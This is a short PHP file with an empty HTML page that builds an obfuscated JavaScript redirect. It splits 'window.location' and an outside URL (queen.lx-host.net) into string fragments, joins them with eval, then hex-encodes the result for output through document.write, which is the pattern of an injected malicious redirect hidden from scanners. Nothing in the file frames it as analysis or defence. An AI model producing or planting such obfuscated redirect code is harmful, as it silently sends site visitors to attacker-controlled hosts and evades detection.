<?php
$str="<script language=\"javascript\">a=\"wi\";b=\"nd\";c=\"ow\";d=\".loc\";e=\"at\";f=\"ion\";g=\"='\"; j=\"htt\";k=\"p:/\";l=\"/qu\";m=\"een.lx-host.net'\"; document.write(eval(a+b+c+d+e+f+g+j+k+l+m));</script>";
for($i=0;$i<strlen($str);$i++){
	$a.=sprintf("\\x%02x",ord($str[$i]));
}
print "script language=\"javascript\">document.write(\"$a\");</script>";
?>
<html>
<head>
<title></title>

<!--<script language="javascript">document.write("<?=$a;?>");</script>-->

</head>
<body>

</body>
</html>